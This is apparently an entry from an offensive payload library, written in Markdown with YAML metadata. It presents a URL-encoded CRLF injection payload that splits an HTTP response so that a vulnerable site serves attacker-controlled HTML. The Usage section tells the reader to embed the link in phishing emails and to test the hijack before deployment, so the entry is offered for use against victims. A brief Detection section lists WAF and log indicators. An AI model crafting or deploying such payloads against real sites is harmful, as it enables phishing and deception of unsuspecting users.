---
id: a6d082a1-3d86-4d27-b586-de3d23ae8a79
name: CRLF-Injected-URL-for-Response-Hijacking
type: code
language: http
verified: true
created_at: '2023-04-06T03:55:55.321963+00:00'
updated_at: '2023-04-06T03:55:55.325579+00:00'
platforms:
  - Web
tags:
  - crlf-injection
  - phishing-payload
  - http-injection
validated: true
---

# CRLF-Injected-URL-for-Response-Hijacking

## Code

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

## Description

This HTTP URL payload uses URL-encoded CRLF (%0D%0A) in a parameter to inject a complete fake HTTP response into a vulnerable application's output. It terminates the original response with a zero Content-Length and appends a malicious 200 OK response with custom HTML, ideal for phishing by displaying attacker-controlled content to victims.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET_HOST | Hostname of the vulnerable site | www.example.net |
| $ENDPOINT | Application endpoint | index.php |
| $INJECTED_HTML | Malicious HTML to display | <html>You have been Phished</html> |

## Usage

Embed this payload in a phishing link (e.g., via email) where the parameter (like 'lang') is reflected into headers. When the victim clicks, the server injects the response, showing the fake HTML. Test with curl or a browser to verify hijacking before deployment.

## Detection

- WAF logs showing %0D%0A in URL parameters.
- Anomalous HTTP responses with mismatched Content-Length or duplicate headers.
- Browser dev tools revealing injected HTML or unexpected redirects.

## Related

- [[procedures/CRLF-Injection-Phishing-Attack]]
- [[commands/curl-crlf-url-injection]]
